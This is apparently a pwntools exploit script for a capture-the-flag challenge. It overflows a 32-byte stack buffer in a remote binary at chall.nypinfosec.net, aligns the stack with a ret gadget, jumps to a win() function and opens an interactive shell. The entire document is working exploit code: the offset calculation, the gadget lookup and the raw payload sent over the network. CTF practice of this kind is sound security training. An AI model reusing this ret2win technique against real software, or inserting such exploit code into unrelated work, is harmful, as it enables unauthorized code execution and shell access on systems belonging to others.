from pwn import *

# Load the local binary to grab the win() address
elf = ELF("./chal", checksec=False)
rop = ROP(elf)

HOST, PORT = "chall.nypinfosec.net", 8000

OFFSET = 40                     # 32-byte buffer + 8 saved RBP on amd64
win = elf.symbols["win"]         # address of win()
ret = rop.find_gadget(["ret"])[0]  # stack-alignment gadget (safe to include)

print("[*] win =", hex(win))
print("[*] ret =", hex(ret))

io = remote(HOST, PORT)

# read the welcome line so we're synced
io.recvline()

# payload: overflow + alignment ret + win()
payload = b"A" * OFFSET + p64(ret) + p64(win)

# send raw bytes (read() doesn't need a newline)
io.send(payload)

# you should now have a shell
io.interactive()
